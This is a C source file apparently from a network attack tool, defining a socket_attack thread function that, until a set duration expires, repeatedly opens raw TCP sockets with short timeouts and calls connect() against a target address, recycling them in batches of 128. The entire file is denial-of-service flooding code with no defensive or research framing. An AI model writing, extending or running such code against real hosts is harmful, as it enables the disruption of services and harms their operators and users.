#define _GNU_SOURCE

#include "headers/socket_attack.h"
#include <fcntl.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <errno.h>

void* socket_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;
    time_t end = time(NULL) + params->duration;
    int s[128]; int i = 0;
    struct sockaddr_in t = params->target_addr;
    int f = 1; struct timeval tv = {0};
    tv.tv_usec = 1000;
    while (params->active && time(NULL) < end) {
        s[i] = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (s[i] >= 0) {
            fcntl(s[i], F_SETFL, O_NONBLOCK);
            setsockopt(s[i], SOL_SOCKET, SO_REUSEADDR, &f, sizeof(f));
            setsockopt(s[i], SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
            setsockopt(s[i], SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            setsockopt(s[i], IPPROTO_TCP, TCP_NODELAY, &f, sizeof(f));
            connect(s[i], (struct sockaddr*)&t, sizeof(t));
        }
        if (++i == 128) {
            for (int j = 0; j < 128; j++) close(s[j]);
            i = 0;
        }
    }
    for (int j = 0; j < i; j++) close(s[j]);
    return NULL;
}
